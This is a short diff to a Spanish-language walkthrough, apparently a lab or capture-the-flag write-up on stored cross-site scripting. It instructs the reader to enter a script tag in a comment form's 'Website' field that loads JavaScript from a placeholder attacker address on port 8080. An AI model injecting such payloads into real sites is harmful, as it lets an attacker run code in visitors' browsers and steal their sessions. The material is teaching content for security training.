@@ -21,4 +21,11 @@ Ahora, fijate en esto, parece que nos llevara a la sección de comentarios asi q
 
 ![CommentSection](imgs/XSS/three.png)
 
-![](imgs/XSS/.png)
+Y pongamos cualquier cosa pero en la seccion de "Website" debemos poner:
+```
+<script src="http://[YOUR_IP]:8080"></script>
+```
+
+![CommentTest](imgs/XSS/five.png)
+
+### Porque hacemos eso?
